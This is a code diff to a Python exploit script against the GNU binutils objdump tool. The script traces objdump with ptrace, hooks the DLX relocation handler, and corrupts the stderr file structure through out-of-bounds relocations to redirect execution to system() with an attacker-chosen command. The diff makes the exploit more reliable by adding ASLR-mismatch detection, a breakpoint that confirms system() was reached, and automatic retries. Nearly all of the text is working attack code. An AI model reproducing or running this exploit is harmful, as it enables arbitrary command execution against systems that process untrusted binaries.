@@ -128,6 +128,7 @@ from pathlib import Path
 
 OBJDUMP_BIN = "./binutils-gdb/build/binutils/objdump"
 EXPLOIT_BIN = "./exploit.bin"
+MAX_RETRIES = 5
 
 # Exploit constants
 
@@ -341,10 +342,13 @@ def validate_command(cmd: str) -> int:
 
 # Main exploit logic
 
-def exploit(cmd: str = "ps"):
+def exploit(cmd: str = "ps") -> bool:
     """
     Spawn objdump under ptrace, intercept elf32_dlx_relocate26() calls,
     and patch OOB relocations to corrupt stderr for FSOP → system().
+
+    Returns True on success (system() confirmed called), False on failure
+    (ASLR byte-3 mismatch or crash before system()) — caller retries.
     """
     # Verify prerequisites
     if not Path(EXPLOIT_BIN).exists():
@@ -395,6 +399,9 @@ def exploit(cmd: str = "ps"):
     system_addr = None
     wfile_addr = None
     patched_structs = False
+    orig_word_sys = None
+    bp_word_sys = None
+    success = False
 
     # Breakpoint loop
     while True:
@@ -404,7 +411,11 @@ def exploit(cmd: str = "ps"):
             print(f"[*] Child exited (code {os.WEXITSTATUS(status)})")
             break
         if os.WIFSIGNALED(status):
-            print(f"[*] Child killed by signal {os.WTERMSIG(status)}")
+            sig = os.WTERMSIG(status)
+            if not success:
+                print(f"[!] Child killed by signal {sig} before system() — ASLR mismatch, will retry")
+                return False
+            print(f"[*] Child killed by signal {sig} (after system() — expected)")
             break
         if not os.WIFSTOPPED(status):
             ptrace(PTRACE_CONT, pid, 0, 0)
@@ -413,11 +424,22 @@ def exploit(cmd: str = "ps"):
         sig = wstopsig(status)
         if sig != signal.SIGTRAP:
             # Non-SIGTRAP signal (e.g., SIGCHLD after system() completes)
-            print(f"[*] Signal {sig} received — forwarding and exiting")
             ptrace(PTRACE_CONT, pid, 0, sig)
-            break
+            if success:
+                break
+            continue
 
         regs = getregs(pid)
+
+        # system() breakpoint hit → FSOP succeeded
+        if system_addr and regs.rip == system_addr + 1:
+            print("[+] system() reached — command executing")
+            poke(pid, system_addr, orig_word_sys)
+            regs.rip = system_addr
+            setregs(pid, regs)
+            success = True
+            ptrace(PTRACE_CONT, pid, 0, 0)
+            continue
 
         # Verify this is our INT3 breakpoint (RIP points past the 0xCC byte)
         if regs.rip != fn_addr + 1:
@@ -460,6 +482,21 @@ def exploit(cmd: str = "ps"):
             print(f"[*] libc_base = {libc_base:#016x}")
             print(f"[*] stderr    = {stderr_addr:#016x}")
             print(f"[*] system    = {system_addr:#016x}")
+
+            # Breakpoint at system() to confirm FSOP success
+            orig_word_sys = peek(pid, system_addr)
+            bp_word_sys = (orig_word_sys & ~0xFF) | 0xCC
+            poke(pid, system_addr, bp_word_sys)
+
+            # Byte-3 diagnostic: PCREL26 only writes bytes[0,1,2] of pointers;
+            # byte[3] is inherited from the original value in stderr. When
+            # data_addr and libc straddle a 16MB boundary, byte[3] of
+            # fake_wdata != byte[3] of the original _wide_data → crash.
+            existing_wd = peek(pid, stderr_addr + 0xA0)
+            wd_b3   = (existing_wd >> 24) & 0xFF
+            data_b3 = (data_addr >> 24) & 0xFF
+            if wd_b3 != data_b3:
+                print(f"[!] byte-3 mismatch: data={data_b3:#04x} libc={wd_b3:#04x} — this attempt will fail")
 
         # Compute actual delta between section buffer and stderr.
         # May differ from EXPECTED_DELTA_STDERR if ptrace causes
@@ -537,7 +574,7 @@ def exploit(cmd: str = "ps"):
     except ChildProcessError:
         pass
 
-    print("[+] Done")
+    return success
 
 
 # Entry point
@@ -556,7 +593,13 @@ def main():
         ),
     )
     args = parser.parse_args()
-    exploit(args.cmd)
+    for attempt in range(1, MAX_RETRIES + 1):
+        if attempt > 1:
+            print(f"\n[*] Retry {attempt}/{MAX_RETRIES}")
+        if exploit(args.cmd):
+            print("[+] Done")
+            return
+    print(f"[!] Failed after {MAX_RETRIES} attempts")
 
 
 if __name__ == "__main__":
